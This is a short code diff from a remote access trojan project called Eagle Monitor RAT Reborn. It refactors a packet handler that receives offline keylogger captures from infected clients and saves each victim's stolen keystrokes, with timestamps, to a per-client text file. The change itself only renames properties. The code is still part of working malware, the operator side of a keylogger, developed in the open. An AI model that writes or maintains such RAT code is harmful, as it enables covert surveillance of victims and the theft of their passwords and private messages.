@@ -14,8 +14,8 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public KeylogOfflinePacketHandler(KeylogOfflinePacket keylogOfflinePacket, ClientHandler clientHandler)
         {
-            Directory.CreateDirectory(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\");
-            File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + Utils.DateFormater() + "\n--------------------------------------------\n");
+            Directory.CreateDirectory(ClientHandler.ClientHandlersList[keylogOfflinePacket.BaseIp].ClientPath + "\\Keystrokes\\");
+            File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.BaseIp].ClientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + Utils.DateFormater() + "\n--------------------------------------------\n");
         }
     }
 }
